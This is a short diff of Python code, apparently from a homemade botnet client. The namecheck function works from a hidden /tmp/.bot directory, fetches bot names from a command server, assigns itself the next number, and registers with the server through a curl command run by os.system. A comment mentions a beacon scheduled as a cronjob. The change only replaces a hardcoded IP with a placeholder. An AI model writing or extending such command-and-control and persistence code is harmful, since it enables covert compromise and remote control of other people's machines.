@@ -34,14 +34,14 @@ def directoryhandler():
 def namecheck():
 	dir = os.path.join('/tmp','.bot')
 	os.chdir(dir)
-	botnames = requests.get('http://10.0.2.15:8080/botnames.txt')
+	botnames = requests.get('{IP}:8080/botnames.txt')
 	data = botnames.text.strip().split()
 	lastbot = data[-1]
 	with open('name.txt', 'r+') as f:
 		if f.read() =='':
 			myname = str(int(lastbot)+1)
 			f.write(myname)
-			request = 'curl -d '+myname+' http://10.0.2.15:8080/botnames.txt'
+			request = 'curl -d '+myname+' {IP}:8080/botnames.txt'
 			os.system(request)
 
 #this is a beacon that runs as a cronjob 
